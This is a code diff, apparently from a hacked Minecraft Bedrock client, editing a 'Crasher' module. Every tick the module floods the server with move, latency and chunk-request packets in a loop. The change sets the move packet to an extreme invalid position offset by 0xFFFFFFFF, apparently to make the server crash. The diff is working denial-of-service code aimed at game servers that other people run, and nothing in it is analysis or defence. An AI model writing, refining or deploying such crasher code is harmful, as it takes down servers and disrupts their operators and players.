@@ -39,20 +39,21 @@ public:
 	virtual void onTick(C_GameMode* gm) override {
 		if (g_Data.getLocalPlayer() == nullptr)
 			setEnabled(false);
-		C_MovePlayerPacket MovePlayerPacket(g_Data.getLocalPlayer(), *g_Data.getLocalPlayer()->getPos());
+		C_MovePlayerPacket MovePlayerPacket(g_Data.getLocalPlayer(), g_Data.getLocalPlayer()->getPos()->add(vec3_t(static_cast<float>(0xFFFFFFFF), static_cast<float>(0xFFFFFFFF), static_cast<float>(0xFFFFFFFF))));
 		NetworkLatencyPacket NetworkPacket;
 		NetworkPacket.timeStamp = 6;
 		C_SubChunkRequestPacket ChunkRequestPacket;
 		//C_PlayerActionPacket PlayerActionPacket;
-		C_AnimatePacket AnimatePacket;
-		//CommandRequestPacket CommandRequestPacket("FADEAWAY ON TOP");
+		//C_AnimatePacket AnimatePacket;
+		//CommandRequestPacket CommandRequestPacket;
+		//CommandRequestPacket.payload = std::string("FADEAWAY ON TOP");
 		if (CrasherMode.selected == 1) {
 			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&ChunkRequestPacket);
 			for (int PacketStorm = 0; PacketStorm < CrasherPPS; PacketStorm++) {
 				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&MovePlayerPacket);
 				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&NetworkPacket);
 				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&PlayerActionPacket);
-				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&AnimatePacket);
+				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&AnimatePacket);
 				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&CommandRequestPacket);
 			}
 		}
